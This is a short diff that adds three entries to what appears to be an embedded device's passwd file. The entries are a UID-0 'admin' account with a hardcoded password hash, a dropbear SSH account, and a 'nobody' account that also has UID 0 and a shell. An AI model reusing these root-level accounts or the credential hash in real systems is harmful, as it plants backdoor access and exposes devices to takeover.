@@ -1,0 +1,3 @@
+admin:I55OiXWnKr89Y:0:0:root:/:/bin/sh
+dropbear:x:500:500:dropbear:/var/tmp/dropbear:/bin/sh
+nobody:*:0:0:nobody:/:/bin/sh
